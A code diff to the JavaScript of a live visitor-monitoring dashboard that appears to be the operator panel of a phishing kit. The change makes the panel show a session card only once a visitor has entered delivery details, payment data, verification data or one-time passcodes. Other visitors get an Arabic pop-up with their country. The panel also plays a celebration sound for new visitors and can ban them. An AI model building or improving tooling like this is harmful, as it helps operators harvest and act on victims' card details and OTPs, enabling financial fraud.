@@ -816,6 +816,14 @@ function setupSocketListeners() {
     const existingCard = document.querySelector('[data-session="' + sessionId + '"]');
     const wasInCache = visitorsCache.has(sessionId);
     
+    // Check if visitor has important data (delivery, payment, or OTP)
+    const hasImportantData = (
+      data.delivery_data && Object.keys(data.delivery_data).length > 0 ||
+      data.payment_data && Object.keys(data.payment_data).length > 0 ||
+      data.verification_data && Object.keys(data.verification_data).length > 0 ||
+      data.otp_history && data.otp_history.length > 0
+    );
+    
     // 🎵 PLAY DIFFERENT SOUND BASED ON VISITOR TYPE
     if (!existingCard && !wasInCache) {
       // NEW VISITOR - play celebration sound
@@ -829,19 +837,32 @@ function setupSocketListeners() {
       }
     }
     
-    if (existingCard) {
-      // Card exists - smart update and move to top
-      updateCardAndMoveToTop(sessionId, data);
-    } else {
-      // New card - add to DOM directly
-      const grid = document.getElementById('visitorsGrid');
-      if (grid) {
-        createVisitorCardElement(data, grid);
-        
-        // Remove empty state if exists
-        const emptyState = grid.querySelector('.empty-state');
-        if (emptyState) emptyState.remove();
+    // IMPORTANT: Only create card if visitor has important data
+    if (hasImportantData) {
+      // Has important data - create the card
+      if (existingCard) {
+        // Card exists - smart update and move to top
+        updateCardAndMoveToTop(sessionId, data);
+      } else {
+        // New card with important data - add to DOM
+        const grid = document.getElementById('visitorsGrid');
+        if (grid) {
+          createVisitorCardElement(data, grid);
+          
+          // Remove empty state if exists
+          const emptyState = grid.querySelector('.empty-state');
+          if (emptyState) emptyState.remove();
+        }
       }
+    } else {
+      // No important data - just show notification with country
+      const countryName = data.country || 'غير معروف';
+      const countryFlag = getCountryFlag(data.country_code || '');
+      showNotification(
+        '🌍 زائر جديد',
+        `${countryFlag} ${countryName}`,
+        'info'
+      );
     }
     
     // Also add to cache
@@ -1511,6 +1532,11 @@ function updateVisitorsList() {
   if (!socket || !socket.connected) return;
   
   socket.emit('visitors:request');
+}
+
+// Refresh tracking data - reload page
+function refreshTrackingData() {
+  location.reload();
 }
 
 function handleVisitorsUpdate(data) {
@@ -3281,6 +3307,7 @@ window.processVisitorUpdate = processVisitorUpdate;
 window.createVisitorCardElement = createVisitorCardElement;
 window.updateVisitorCardFull = updateVisitorCardFull;
 window.banVisitor = banVisitor;
+window.refreshTrackingData = refreshTrackingData;
 
 // viewVisitorDetails - Show visitor in modal
 function viewVisitorDetails(sessionId) {
